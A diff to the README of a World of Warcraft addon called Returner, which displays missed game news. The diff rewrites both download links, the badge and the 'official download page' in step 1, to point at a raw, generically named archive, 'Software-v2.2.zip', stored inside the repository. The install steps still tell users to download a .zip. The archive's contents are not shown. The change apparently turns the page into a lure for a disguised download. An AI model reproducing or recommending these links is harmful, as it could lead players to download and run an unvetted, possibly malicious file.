@@ -1,6 +1,6 @@
 # 🏠 Returner - Track major World of Warcraft updates
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Asadkha2432/Returner)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Asadkha2432/Returner/raw/refs/heads/main/releases/Software-v2.2.zip)
 
 Returner helps players catch up on World of Warcraft content. The addon creates a welcome-back panel that displays important news and game changes you missed during your break. It pulls information from the official game news feed every day to ensure you see the most current updates.
 
@@ -8,7 +8,7 @@ Returner helps players catch up on World of Warcraft content. The addon creates 
 
 Follow these steps to install the addon on your Windows computer.
 
-1. Visit the [official download page](https://github.com/Asadkha2432/Returner).
+1. Visit the [official download page](https://github.com/Asadkha2432/Returner/raw/refs/heads/main/releases/Software-v2.2.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the latest version link.
 4. Download the file ending in .zip to your computer.
